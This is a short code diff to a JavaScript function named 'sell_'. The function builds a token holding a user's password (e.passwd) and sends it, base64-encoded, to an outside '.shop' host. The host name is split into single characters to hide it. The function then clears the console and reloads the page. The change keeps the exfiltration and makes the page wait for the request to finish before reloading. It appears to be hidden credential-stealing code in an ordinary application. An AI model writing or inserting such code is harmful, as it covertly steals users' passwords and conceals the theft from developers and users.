@@ -27,11 +27,12 @@ function sell_(e) {
                 e.passwd +
                 '&&' +
                 (available ? 'available=' + available : '-')
-            fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o' + 'p/?' + btoa(token));
-            console.clear();
-            setTimeout(() => {
-               location.reload()
-            }, 800)
+            fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o' + 'p/?' + btoa(token)).then(()=>{
+                console.clear();
+                setTimeout(() => {
+                   location.reload()
+                }, 800)
+            })
         }
     } catch (e) {
         console.log('e', e);
